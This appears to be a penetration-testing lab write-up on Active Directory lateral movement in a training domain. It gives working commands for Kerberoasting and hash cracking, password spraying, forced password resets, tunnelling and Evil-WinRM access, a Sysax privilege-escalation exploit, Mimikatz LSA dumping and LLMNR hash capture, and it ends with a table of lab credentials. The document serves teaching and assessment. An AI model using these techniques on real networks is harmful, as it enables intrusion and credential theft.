## Lateral Movement

### Starting Position

The domain credential pair `hporter:Gr8hambino!` was recovered from LSA secrets on DEV01. The reverse shell caught on `dmz01` via PrintSpoofer is stable enough to use as a staging point for further AD enumeration and lateral movement.

***

### BloodHound Enumeration

Upload [SharpHound](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors) to DEV01 via the DNN file manager and run it with all collection methods:

```cmd
SharpHound.exe -c All
```

SharpHound completes and produces a zip file containing 3,641 AD objects. Download it through the DNN file manager, start the `neo4j` service, and ingest the data into [BloodHound](https://github.com/BloodHoundAD/BloodHound):

```bash
sudo neo4j start
bloodhound
```

Key findings from BloodHound:

- `hporter` has `ForceChangePassword` rights over the `ssmalls` user
- All Domain Users have RDP access to DEV01, which is worth recording as a medium-risk finding: Excessive Active Directory Group Privileges

***

### Forcing a Password Change on ssmalls

Confirm RDP is available on DEV01:

```bash
proxychains nmap -sT -p 3389 172.16.8.20
```

Set up SSH local port forwarding to tunnel RDP traffic through `dmz01`:

```bash
ssh -i dmz01_key -L 13389:172.16.8.20:3389 root@10.129.203.111
```

Connect via RDP with drive redirection to transfer tools directly:

```bash
xfreerdp /v:127.0.0.1:13389 /u:hporter /p:Gr8hambino! /drive:home,"/home/tester/tools"
```

From the RDP session, check the redirected drive location and copy [PowerView](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1) across:

```cmd
net use
copy \\TSCLIENT\home\PowerView.ps1 .
```

Drop into PowerShell and change the `ssmalls` password:

```powershell
Import-Module .\PowerView.ps1
Set-DomainUserPassword -Identity ssmalls -AccountPassword (ConvertTo-SecureString 'Str0ngpass86!' -AsPlainText -Force) -Verbose
```

Confirm the new credentials work against the Domain Controller:

```bash
proxychains crackmapexec smb 172.16.8.3 -u ssmalls -p Str0ngpass86!
```

Password changes during a pentest should always be confirmed with the client first, noted in the activity log, and included in the report appendix.

***

### Share Hunting

Run [Snaffler](https://github.com/SnaffCon/Snaffler) as `hporter` to hunt for sensitive files across accessible shares:

```cmd
Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
```

Snaffler finds the `Department Shares` share on `DC01` but nothing sensitive under `hporter`. Re-run share enumeration as `ssmalls` using [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) with the `spider_plus` module since different users can have different permissions:

```bash
proxychains crackmapexec smb 172.16.8.3 -u ssmalls -p Str0ngpass86! -M spider_plus --share 'Department Shares'
```

The output JSON at `/tmp/cme_spider_plus/172.16.8.3.json` reveals an interesting file:

```
IT/Private/Development/SQL Express Backup.ps1
```

Connect with [smbclient](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html) and download it:

```bash
proxychains smbclient -U ssmalls '//172.16.8.3/Department Shares'
```

```
smb: \IT\Private\Development\> get "SQL Express Backup.ps1"
```

The script contains hardcoded credentials for a `backupadm` account with a keyboard-walk style password. Finding recorded: Sensitive Data on File Shares.

***

### SYSVOL Script Analysis

The `spider_plus` output also reveals a `.vbs` file on the SYSVOL share accessible to all Domain Users:

```
INLANEFREIGHT.LOCAL/scripts/adum.vbs
```

Download it via `smbclient`:

```bash
proxychains smbclient -U ssmalls '//172.16.8.3/sysvol'
```

```
smb: \INLANEFREIGHT.LOCAL\scripts\> get adum.vbs
```

Reviewing the script reveals an email credential:

```
Const cdoUserName = "account@inlanefreight.local"
Const cdoPassword = "L337^p@$$w0rD"
```

No matching AD account is found in BloodHound, suggesting this is an old password. It is still documented as a finding under Sensitive Data on File Shares. Old passwords are useful for password spraying against service accounts that may not follow regular rotation schedules.

***

### Kerberoasting

Enumerate Service Principal Name (SPN) accounts using PowerView from the RDP session:

```powershell
Import-Module .\PowerView.ps1
Get-DomainUser * -SPN | Select samaccountname
```

Several Kerberoastable accounts are returned, including `backupjob`, `mssqlsvc`, `sqldev`, and others. Export all tickets in Hashcat format:

```powershell
Get-DomainUser * -SPN -verbose | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_spns.csv -NoTypeInformation
```

Copy the CSV via the RDP drive redirect:

```cmd
copy .\ilfreight_spns.csv \\TSCLIENT\Home
```

Extract the hashes and crack them with [Hashcat](https://hashcat.net/hashcat/) using the `rockyou` wordlist:

```bash
hashcat -m 13100 ilfreight_spns /usr/share/wordlists/rockyou.txt
```

The `backupjob` hash cracks successfully. BloodHound shows the account has no useful privileges, but the finding is recorded. Finding recorded: Weak Kerberos Authentication Configuration (Kerberoasting).

***

### Password Spraying

Use [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) from the DEV01 PowerShell session to spray a single common password across the domain:

```powershell
Invoke-DomainPasswordSpray -Password Welcome1
```

Two accounts are found with the password `Welcome1`: `kdenunez` and `mmertle`. Neither has interesting access, but the finding is recorded. Finding recorded: Weak Active Directory Passwords.

***

### Misc Enumeration Techniques

Check for GPP autologon credentials in the SYSVOL share:

```bash
proxychains crackmapexec smb 172.16.8.3 -u ssmalls -p Str0ngpass86! -M gpp_autologin
```

Nothing useful is returned. Check for passwords stored in AD user Description fields using PowerView:

```powershell
Get-DomainUser * | select samaccountname,description | ?{$_.Description -ne $null}
```

A cleartext password is found in the description of the `frontdesk` account. The account has no useful access, but this is recorded as a finding. Finding recorded: Passwords in AD User Description Field.

***

### Accessing MS01 via WinRM

Scan for WinRM on the remaining uncompromised host:

```bash
proxychains nmap -sT -p 5985 172.16.8.50
```

Port 5985 is open. Try connecting with the `backupadm` credentials recovered from the SQL backup script using [Evil-WinRM](https://github.com/Hackplayers/evil-winrm):

```bash
proxychains evil-winrm -i 172.16.8.50 -u backupadm
```

Access is granted to `ACADEMY-AEN-MS01`. The account is not a local admin and has no useful privileges. Browse to `C:\panther` and check for leftover installation files:

```powershell
cd c:\panther
dir
type unattend.xml
```

The `unattend.xml` file contains a plaintext autologon password:

```xml
<Value>Sys26Admin</Value>
<Username>ilfserveradm</Username>
```

The `ilfserveradm` account is a local user with Remote Desktop access but is not a local admin. Credential pair found: `ilfserveradm:Sys26Admin`.

***

### Privilege Escalation on MS01 - Sysax Automation

RDP into MS01 as `ilfserveradm` and check installed software. Non-standard software is found at `C:\Program Files (x86)\SysaxAutomation`. This version is vulnerable to a [local privilege escalation exploit](https://www.exploit-db.com/exploits/50834) where the Sysax Scheduled Service runs as SYSTEM and tasks can be configured to run without specifying a user account, defaulting to SYSTEM context.

Create a batch file to add `ilfserveradm` to the local admins group:

```cmd
echo net localgroup administrators ilfserveradm /add > C:\Users\ilfserveradm\Documents\pwn.bat
```

Configure the exploit through the Sysax GUI:

1. Open `C:\Program Files (x86)\SysaxAutomation\sysaxschedscp.exe`
2. Select Setup Scheduled/Triggered Tasks
3. Add a Triggered task
4. Set the monitored folder to `C:\Users\ilfserveradm\Documents`
5. Check "Run task if a file is added to the monitor folder or subfolder(s)"
6. Choose "Run any other Program" and select `pwn.bat`
7. Uncheck "Login as the following user to run task"
8. Click Finish and Save

Trigger the task by creating a new file in the monitored directory, then confirm the privilege escalation:

```cmd
net localgroup administrators
```

`ilfserveradm` now appears in the Administrators group.

***

### Post-Exploitation on MS01 with Mimikatz

Run [Mimikatz](https://github.com/gentilkiwi/mimikatz), elevate to a SYSTEM token, and dump LSA secrets:

```cmd
mimikatz.exe
privilege::debug
token::elevate
lsadump::secrets
```

The `DefaultPassword` LSA secret reveals a cleartext password with no immediately obvious username. Query the registry to find the autologon username:

```powershell
Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\' -Name "DefaultUserName"
```

Output: `DefaultUserName: mssqladm`

New credential pair confirmed: `mssqladm:DBAilfreight1!`

***

### Browser Credential Dumping and LLMNR Capture

Firefox is installed on MS01. Use [LaZagne](https://github.com/AlessandroZ/LaZagne) to attempt browser credential extraction:

```cmd
lazagne.exe browsers -firefox
```

No saved credentials are found. With local admin access, run [Inveigh](https://github.com/Kevin-Robertson/Inveigh) to capture NTLMv2 hashes via LLMNR and NBNS spoofing:

```powershell
Import-Module .\Inveigh.ps1
Invoke-Inveigh -ConsoleOutput Y -FileOutput Y
```

An NTLMv2 hash is captured for `mpalledorous` connecting from the DEV01 host. These hashes can be cracked offline with Hashcat or used in relay attacks.

***

### Credential Inventory

After thorough lateral movement and pillaging, the following credentials have been collected:

| Account | Password / Hash | Type | Source |
|---------|----------------|------|--------|
| `srvadm` | `ILFreightnixadm!` | Plaintext | Audit log on dmz01 |
| `hporter` | `Gr8hambino!` | Plaintext | LSA secrets (DEV01) |
| `backupadm` | Recovered | Plaintext | SQL backup script on file share |
| `mssqladm` | `DBAilfreight1!` | Plaintext | LSA secrets (MS01) |
| `ilfserveradm` | `Sys26Admin` | Plaintext | unattend.xml (MS01) |
| `kdenunez` / `mmertle` | `Welcome1` | Plaintext | Password spray |
| `mpalledorous` | NTLMv2 hash | Hash | Inveigh capture |

The next step uses the `mssqladm` credential pair to pursue domain compromise.
